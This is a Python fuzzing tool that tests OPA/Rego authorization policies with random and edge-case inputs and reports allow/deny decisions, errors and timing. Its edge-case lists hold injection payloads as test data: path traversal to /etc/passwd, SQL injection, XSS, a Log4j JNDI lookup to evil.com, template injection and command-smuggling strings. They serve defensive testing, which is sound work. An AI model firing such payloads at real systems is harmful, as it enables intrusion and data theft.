#!/usr/bin/env python3
"""
OPA Policy Fuzzing Engine
Strategickhaos Sovereign Infrastructure Security Testing Suite

Comprehensive fuzzing for OPA/Rego policies using property-based testing.
Features:
- Property-based test generation with Hypothesis
- Edge case injection (null, empty, malformed, oversized)
- Coverage analysis
- NDJSON reporting for log aggregation
- Integration with CI/CD pipelines
"""

import argparse
import hashlib
import json
import logging
import os
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

# Property-based testing
try:
    from hypothesis import given, settings, Verbosity, Phase
    from hypothesis import strategies as st
    HYPOTHESIS_AVAILABLE = True
except ImportError:
    HYPOTHESIS_AVAILABLE = False
    print("Warning: hypothesis not installed. Install with: pip install hypothesis")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class FuzzResult:
    """Result of a single fuzz test iteration"""
    iteration: int
    input_hash: str
    input_data: Dict[str, Any]
    decision: Optional[bool]
    error: Optional[str]
    duration_ms: float
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    
    def to_ndjson(self) -> str:
        return json.dumps(asdict(self))


@dataclass
class FuzzReport:
    """Comprehensive fuzzing report"""
    policy_path: str
    total_iterations: int
    successful: int
    errors: int
    allow_count: int
    deny_count: int
    avg_duration_ms: float
    min_duration_ms: float
    max_duration_ms: float
    unique_inputs: int
    coverage_estimate: float
    error_categories: Dict[str, int]
    edge_cases_tested: List[str]
    start_time: str
    end_time: str
    duration_seconds: float
    
    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)


class OPAFuzzer:
    """
    Comprehensive OPA policy fuzzer with property-based testing.
    """
    
    # Edge case generators
    EDGE_CASE_STRINGS = [
        "",  # Empty string
        " ",  # Whitespace
        "null",  # String "null"
        "undefined",  # String "undefined"
        "true",  # String "true"
        "false",  # String "false"
        "0",  # String "0"
        "-1",  # Negative number string
        "NaN",  # Not a number string
        "Infinity",  # Infinity string
        "../../../etc/passwd",  # Path traversal
        "'; DROP TABLE users; --",  # SQL injection
        "<script>alert('xss')</script>",  # XSS
        "admin' OR '1'='1",  # Auth bypass
        "a" * 10000,  # Long string
        "\x00\x01\x02",  # Null bytes
        "🎭🔐👤",  # Unicode emojis
        "\n\r\t",  # Control characters
        "${jndi:ldap://evil.com}",  # Log4j pattern
        "{{7*7}}",  # Template injection
    ]
    
    EDGE_CASE_ROLES = [
        "admin",
        "user",
        "moderator",
        "guest",
        "",  # Empty role
        "Admin",  # Case variation
        "ADMIN",  # Uppercase
        "superadmin",  # Non-existent role
        "root",  # System role
        "system",  # System role
        "../admin",  # Path traversal in role
        "admin\x00user",  # Null byte injection
    ]
    
    EDGE_CASE_ACTIONS = [
        "read",
        "write",
        "delete",
        "admin",
        "moderate",
        "",  # Empty action
        "READ",  # Uppercase
        "superdelete",  # Non-existent
        "*",  # Wildcard
        "read,write",  # Multiple actions
        "read; delete",  # Injection attempt
    ]
    
    EDGE_CASE_PATHS = [
        "/api/v1/resources/123",
        "/health",
        "/metrics",
        "/api/v1/admin/users",
        "",  # Empty path
        "/",  # Root
        "//",  # Double slash
        "/../../../etc/passwd",  # Path traversal
        "/api/v1/../admin/users",  # Relative path
        "/api/v1/resources/-1",  # Negative ID
        "/api/v1/resources/0",  # Zero ID
        "/api/v1/resources/999999999999",  # Large ID
        "/api/v1/resources/' OR '1'='1",  # SQL injection
        "/api/v1/resources/<script>",  # XSS in path
    ]
    
    def __init__(
        self,
        policy_path: str,
        opa_binary: str = "opa",
        package_name: str = "authz",
        decision_query: str = "data.authz.allow"
    ):
        self.policy_path = Path(policy_path)
        self.opa_binary = opa_binary
        self.package_name = package_name
        self.decision_query = decision_query
        self.results: List[FuzzResult] = []
        self.seen_inputs: Set[str] = set()
        self.error_categories: Dict[str, int] = {}
        
    def _hash_input(self, input_data: Dict) -> str:
        """Generate hash for input deduplication"""
        return hashlib.sha256(
            json.dumps(input_data, sort_keys=True).encode()
        ).hexdigest()[:16]
    
    def _evaluate_policy(self, input_data: Dict) -> tuple[Optional[bool], Optional[str], float]:
        """Evaluate OPA policy with given input"""
        start_time = time.perf_counter()
        
        try:
            # Write input to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({"input": input_data}, f)
                input_file = f.name
            
            # Run OPA evaluation
            result = subprocess.run(
                [
                    self.opa_binary, "eval",
                    "-d", str(self.policy_path),
                    "-i", input_file,
                    self.decision_query,
                    "--format", "json"
                ],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            duration_ms = (time.perf_counter() - start_time) * 1000
            
            # Clean up temp file
            os.unlink(input_file)
            
            if result.returncode != 0:
                error_msg = result.stderr.strip() or "Unknown OPA error"
                self._categorize_error(error_msg)
                return None, error_msg, duration_ms
            
            # Parse result
            output = json.loads(result.stdout)
            
            # Extract decision from OPA output
            if output.get("result") and len(output["result"]) > 0:
                expressions = output["result"][0].get("expressions", [])
                if expressions and len(expressions) > 0:
                    decision = expressions[0].get("value", False)
                    return bool(decision), None, duration_ms
            
            return False, None, duration_ms
            
        except subprocess.TimeoutExpired:
            duration_ms = (time.perf_counter() - start_time) * 1000
            self._categorize_error("timeout")
            return None, "Policy evaluation timeout", duration_ms
        except json.JSONDecodeError as e:
            duration_ms = (time.perf_counter() - start_time) * 1000
            self._categorize_error("json_error")
            return None, f"JSON decode error: {str(e)}", duration_ms
        except Exception as e:
            duration_ms = (time.perf_counter() - start_time) * 1000
            self._categorize_error(type(e).__name__)
            return None, str(e), duration_ms
    
    def _categorize_error(self, error: str):
        """Categorize errors for reporting"""
        # Normalize error message
        if "timeout" in error.lower():
            category = "timeout"
        elif "parse" in error.lower() or "syntax" in error.lower():
            category = "parse_error"
        elif "undefined" in error.lower():
            category = "undefined_reference"
        elif "type" in error.lower():
            category = "type_error"
        else:
            category = "other"
        
        self.error_categories[category] = self.error_categories.get(category, 0) + 1
    
    def generate_random_input(self) -> Dict[str, Any]:
        """Generate random input for fuzzing"""
        import random
        
        # Random user with possible edge cases
        user = {
            "id": random.choice([
                f"user-{random.randint(1, 1000)}",
                "",
                None,
                random.choice(self.EDGE_CASE_STRINGS)
            ]),
            "role": random.choice(self.EDGE_CASE_ROLES),
            "teams": random.choice([
                [],
                [f"team-{random.randint(1, 10)}"],
                None
            ])
        }
        
        # Random resource
        resource = {
            "id": random.choice([
                f"{random.randint(1, 1000)}",
                "",
                None,
                "0",
                "-1"
            ]),
            "owner_id": random.choice([
                user.get("id"),
                f"other-user-{random.randint(1, 100)}",
                "",
                None
            ]),
            "team_id": random.choice([
                None,
                f"team-{random.randint(1, 10)}",
                ""
            ])
        }
        
        return {
            "user": user,
            "action": random.choice(self.EDGE_CASE_ACTIONS),
            "path": random.choice(self.EDGE_CASE_PATHS),
            "resource": resource
        }
    
    def generate_edge_case_inputs(self) -> List[Dict[str, Any]]:
        """Generate comprehensive edge case inputs"""
        edge_cases = []
        
        # Null/empty variations
        edge_cases.append({"user": None, "action": "read", "path": "/test", "resource": {}})
        edge_cases.append({"user": {}, "action": "read", "path": "/test", "resource": {}})
        edge_cases.append({"user": {"id": None, "role": None}, "action": "read", "path": "/test", "resource": {}})
        edge_cases.append({})  # Completely empty input
        
        # Missing fields
        edge_cases.append({"action": "read", "path": "/test"})  # No user
        edge_cases.append({"user": {"id": "1", "role": "user"}, "path": "/test"})  # No action
        edge_cases.append({"user": {"id": "1", "role": "user"}, "action": "read"})  # No path
        
        # Type confusion
        edge_cases.append({"user": "string", "action": "read", "path": "/test", "resource": {}})
        edge_cases.append({"user": {"id": "1", "role": "user"}, "action": 123, "path": "/test", "resource": {}})
        edge_cases.append({"user": {"id": "1", "role": "user"}, "action": "read", "path": [], "resource": {}})
        edge_cases.append({"user": {"id": 123, "role": "user"}, "action": "read", "path": "/test", "resource": {}})
        
        # Array inputs instead of objects
        edge_cases.append({"user": [], "action": "read", "path": "/test", "resource": {}})
        edge_cases.append({"user": {"id": "1", "role": "user"}, "action": "read", "path": "/test", "resource": []})
        
        # Nested injection
        edge_cases.append({
            "user": {
                "id": "1",
                "role": "user",
                "__proto__": {"isAdmin": True}  # Prototype pollution attempt
            },
            "action": "read",
            "path": "/test",
            "resource": {}
        })
        
        # Large inputs
        edge_cases.append({
            "user": {"id": "1", "role": "user", "extra": "x" * 100000},
            "action": "read",
            "path": "/test",
            "resource": {}
        })
        
        # Unicode edge cases
        edge_cases.append({
            "user": {"id": "用户1", "role": "user"},
            "action": "读取",
            "path": "/api/资源",
            "resource": {}
        })
        
        return edge_cases
    
    def fuzz(
        self,
        iterations: int = 1000,
        include_edge_cases: bool = True,
        output_file: Optional[str] = None
    ) -> FuzzReport:
        """
        Run fuzzing campaign against OPA policy.
        
        Args:
            iterations: Number of random iterations
            include_edge_cases: Include edge case inputs
            output_file: NDJSON output file path
        
        Returns:
            FuzzReport with comprehensive results
        """
        start_time = datetime.now(timezone.utc)
        logger.info(f"Starting OPA fuzzing campaign with {iterations} iterations")
        
        # Open output file if specified
        output_handle = None
        if output_file:
            output_handle = open(output_file, 'w')
        
        try:
            # Run edge cases first
            if include_edge_cases:
                edge_cases = self.generate_edge_case_inputs()
                logger.info(f"Running {len(edge_cases)} edge case tests")
                
                for i, input_data in enumerate(edge_cases):
                    self._run_single_test(i, input_data, output_handle, is_edge_case=True)
            
            # Run random iterations
            logger.info(f"Running {iterations} random iterations")
            edge_case_count = len(self.results)
            
            for i in range(iterations):
                input_data = self.generate_random_input()
                self._run_single_test(edge_case_count + i, input_data, output_handle)
                
                if (i + 1) % 100 == 0:
                    logger.info(f"Completed {i + 1}/{iterations} iterations")
        
        finally:
            if output_handle:
                output_handle.close()
        
        end_time = datetime.now(timezone.utc)
        
        # Generate report
        return self._generate_report(start_time, end_time, include_edge_cases)
    
    def _run_single_test(
        self,
        iteration: int,
        input_data: Dict,
        output_handle,
        is_edge_case: bool = False
    ):
        """Run a single fuzz test"""
        input_hash = self._hash_input(input_data)
        
        # Skip duplicate inputs
        if input_hash in self.seen_inputs:
            return
        self.seen_inputs.add(input_hash)
        
        # Evaluate policy
        decision, error, duration_ms = self._evaluate_policy(input_data)
        
        # Create result
        result = FuzzResult(
            iteration=iteration,
            input_hash=input_hash,
            input_data=input_data,
            decision=decision,
            error=error,
            duration_ms=duration_ms
        )
        
        self.results.append(result)
        
        # Write to NDJSON output
        if output_handle:
            output_handle.write(result.to_ndjson() + "\n")
            output_handle.flush()
    
    def _generate_report(
        self,
        start_time: datetime,
        end_time: datetime,
        include_edge_cases: bool
    ) -> FuzzReport:
        """Generate comprehensive fuzzing report"""
        successful = sum(1 for r in self.results if r.error is None)
        errors = sum(1 for r in self.results if r.error is not None)
        allow_count = sum(1 for r in self.results if r.decision is True)
        deny_count = sum(1 for r in self.results if r.decision is False)
        
        durations = [r.duration_ms for r in self.results]
        avg_duration = sum(durations) / len(durations) if durations else 0
        
        edge_cases_tested = []
        if include_edge_cases:
            edge_cases_tested = [
                "null_user", "empty_user", "missing_fields", "type_confusion",
                "array_instead_of_object", "prototype_pollution", "large_input",
                "unicode", "path_traversal", "injection_attempts"
            ]
        
        return FuzzReport(
            policy_path=str(self.policy_path),
            total_iterations=len(self.results),
            successful=successful,
            errors=errors,
            allow_count=allow_count,
            deny_count=deny_count,
            avg_duration_ms=avg_duration,
            min_duration_ms=min(durations) if durations else 0,
            max_duration_ms=max(durations) if durations else 0,
            unique_inputs=len(self.seen_inputs),
            coverage_estimate=successful / len(self.results) if self.results else 0,
            error_categories=self.error_categories,
            edge_cases_tested=edge_cases_tested,
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration_seconds=(end_time - start_time).total_seconds()
        )


def run_hypothesis_fuzzing(policy_path: str, iterations: int = 100):
    """
    Run property-based fuzzing using Hypothesis library.
    """
    if not HYPOTHESIS_AVAILABLE:
        logger.error("Hypothesis library not available")
        return None
    
    fuzzer = OPAFuzzer(policy_path)
    results = []
    
    # Define input strategy
    user_strategy = st.fixed_dictionaries({
        "id": st.one_of(st.text(min_size=1, max_size=50), st.none()),
        "role": st.sampled_from(["admin", "user", "moderator", "guest", "", None]),
        "teams": st.one_of(st.lists(st.text(min_size=1, max_size=20), max_size=5), st.none())
    })
    
    resource_strategy = st.fixed_dictionaries({
        "id": st.one_of(st.text(min_size=1, max_size=50), st.none()),
        "owner_id": st.one_of(st.text(min_size=1, max_size=50), st.none()),
        "team_id": st.one_of(st.text(min_size=1, max_size=20), st.none())
    })
    
    input_strategy = st.fixed_dictionaries({
        "user": user_strategy,
        "action": st.sampled_from(["read", "write", "delete", "admin", "moderate", ""]),
        "path": st.text(min_size=0, max_size=200),
        "resource": resource_strategy
    })
    
    @given(input_data=input_strategy)
    @settings(
        max_examples=iterations,
        verbosity=Verbosity.quiet,
        phases=[Phase.generate, Phase.target]
    )
    def test_policy_never_crashes(input_data):
        """Property: Policy should never crash regardless of input"""
        decision, error, duration = fuzzer._evaluate_policy(input_data)
        # We only fail if there's a crash, not if there's a handled error
        if error and "crash" in error.lower():
            raise AssertionError(f"Policy crashed with input: {input_data}")
    
    try:
        test_policy_never_crashes()
        logger.info("Hypothesis fuzzing completed successfully")
    except Exception as e:
        logger.error(f"Hypothesis fuzzing found issue: {e}")
    
    return fuzzer


def main():
    parser = argparse.ArgumentParser(
        description="OPA Policy Fuzzing Engine - Comprehensive security testing"
    )
    parser.add_argument(
        "--policy", "-p",
        default="policies/authz.rego",
        help="Path to OPA policy file or directory"
    )
    parser.add_argument(
        "--iterations", "-n",
        type=int,
        default=1000,
        help="Number of fuzzing iterations (default: 1000)"
    )
    parser.add_argument(
        "--output", "-o",
        help="NDJSON output file for detailed results"
    )
    parser.add_argument(
        "--report", "-r",
        help="JSON report output file"
    )
    parser.add_argument(
        "--hypothesis",
        action="store_true",
        help="Use Hypothesis for property-based testing"
    )
    parser.add_argument(
        "--no-edge-cases",
        action="store_true",
        help="Skip edge case testing"
    )
    parser.add_argument(
        "--opa-binary",
        default="opa",
        help="Path to OPA binary (default: opa)"
    )
    parser.add_argument(
        "--query", "-q",
        default="data.authz.allow",
        help="OPA decision query (default: data.authz.allow)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Verbose output"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Verify policy file exists
    if not Path(args.policy).exists():
        logger.error(f"Policy file not found: {args.policy}")
        sys.exit(1)
    
    # Check OPA binary
    try:
        subprocess.run([args.opa_binary, "version"], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        logger.error(f"OPA binary not found or not working: {args.opa_binary}")
        logger.error("Install OPA: https://www.openpolicyagent.org/docs/latest/#running-opa")
        sys.exit(1)
    
    # Run fuzzing
    if args.hypothesis and HYPOTHESIS_AVAILABLE:
        logger.info("Running Hypothesis property-based fuzzing")
        fuzzer = run_hypothesis_fuzzing(args.policy, args.iterations)
    else:
        fuzzer = OPAFuzzer(
            args.policy,
            opa_binary=args.opa_binary,
            decision_query=args.query
        )
    
    report = fuzzer.fuzz(
        iterations=args.iterations,
        include_edge_cases=not args.no_edge_cases,
        output_file=args.output
    )
    
    # Output report
    print("\n" + "=" * 60)
    print("OPA FUZZING REPORT")
    print("=" * 60)
    print(f"Policy: {report.policy_path}")
    print(f"Duration: {report.duration_seconds:.2f} seconds")
    print(f"Total Tests: {report.total_iterations}")
    print(f"Successful: {report.successful} ({100*report.successful/report.total_iterations:.1f}%)")
    print(f"Errors: {report.errors} ({100*report.errors/report.total_iterations:.1f}%)")
    print(f"Allow Decisions: {report.allow_count}")
    print(f"Deny Decisions: {report.deny_count}")
    print(f"Avg Duration: {report.avg_duration_ms:.2f}ms")
    print(f"Max Duration: {report.max_duration_ms:.2f}ms")
    print(f"Unique Inputs: {report.unique_inputs}")
    
    if report.error_categories:
        print("\nError Categories:")
        for category, count in report.error_categories.items():
            print(f"  {category}: {count}")
    
    print("=" * 60)
    
    # Save report if requested
    if args.report:
        with open(args.report, 'w') as f:
            f.write(report.to_json())
        logger.info(f"Report saved to {args.report}")
    
    # Exit with error if too many failures
    if report.errors > report.total_iterations * 0.1:
        logger.error("Too many errors encountered during fuzzing")
        sys.exit(1)
    
    sys.exit(0)


if __name__ == "__main__":
    main()
